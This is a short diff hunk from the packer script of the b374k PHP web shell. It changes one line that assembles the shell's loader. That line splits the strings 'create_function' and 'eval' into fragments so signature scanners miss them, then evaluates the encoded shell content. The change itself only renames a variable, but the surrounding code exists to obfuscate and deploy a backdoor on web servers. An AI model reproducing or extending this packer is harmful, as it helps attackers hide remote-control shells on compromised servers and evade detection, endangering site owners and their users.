@@ -590,7 +590,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		}
 
 		$func = '_'.generateRandomString(4);
-		$code = $header.$password."\$ac=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";\$".$func."=\$ac('\$x','ev'.'al'.'(\"?>\".".$encoder.");');\$".$func."(\"".$content."\");{$rc4_function}?>";
+		$code = $header.$password."\$cf=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";\$".$func."=\$cf('\$x','ev'.'al'.'(\"?>\".".$encoder.");');\$".$func."(\"".$content."\");{$rc4_function}?>";
 	}
 	else{
 		if($compress!='no'){
